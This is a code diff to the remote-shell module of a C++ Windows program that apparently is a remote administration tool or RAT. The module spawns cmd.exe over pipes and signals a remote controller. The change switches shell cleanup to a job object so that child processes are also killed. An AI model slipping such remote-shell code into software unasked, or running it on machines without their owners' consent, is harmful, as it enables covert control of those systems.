@@ -14,23 +14,16 @@ CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(p
 	m_hRead = NULL;
 	m_hWrite = NULL;
 
-	m_hCmdProcess = NULL;
-	m_hCmdMainThread = NULL;
+	m_hJob = NULL;
 }
 
 
 CModuleShellRemote::~CModuleShellRemote() {
-	if (m_hCmdProcess != NULL) {
-		TerminateProcess(m_hCmdProcess, 0);
-		WaitForSingleObject(m_hCmdProcess, INFINITE);
-		CloseHandle(m_hCmdProcess);
-		m_hCmdProcess = NULL;
-	}
-	if (m_hCmdMainThread != NULL) {
-		TerminateThread(m_hCmdMainThread, 0);
-		WaitForSingleObject(m_hCmdMainThread, INFINITE);
-		CloseHandle(m_hCmdMainThread);
-		m_hCmdMainThread = NULL;
+	// 中止作业（自动中止CMD.exe进程及其子进程(如ping -t xxx.com子进程)）
+	if (m_hJob != NULL) {
+		TerminateJobObject(m_hJob, 0);
+		CloseHandle(m_hJob);
+		m_hJob = NULL;
 	}
 
 	if (m_hRecvPacketShellRemoteCloseEvent != NULL) {
@@ -100,6 +93,7 @@ DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
 	WCHAR						pszSystemPath[MAX_PATH] = { 0 };
 	WCHAR						pszCommandPath[MAX_PATH] = { 0 };
 
+	
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
 	sa.lpSecurityDescriptor = NULL;
 	sa.bInheritHandle = TRUE;
@@ -128,13 +122,18 @@ DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
 	// 拼接成启动cmd.exe的命令
 	StringCbPrintf(pszCommandPath, MAX_PATH, L"%s\\cmd.exe", pszSystemPath);
 
+	// 创建作业
+	// 一开始没用作业，结果只能中止cmd进程，但是它的子进程，比如ping -t xxx.com，没法中止。杀掉父进程，子进程仍会运行，所以改用作业
+	pThis->m_hJob = CreateJobObject(NULL, NULL);
+
 	// 创建CMD进程
 	if (!CreateProcess(pszCommandPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
 		DebugPrint("error = 0x%x\n", GetLastError());
 		goto Clean;
 	}
-	pThis->m_hCmdProcess = pi.hProcess;
-	pThis->m_hCmdMainThread = pi.hThread;
+
+	// 将cmd进程添加到作业中
+	AssignProcessToJobObject(pThis->m_hJob, pi.hProcess);
 
 	// 创建好进程后就向主控端发送CONNECT响应包。
 	pThis->m_pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
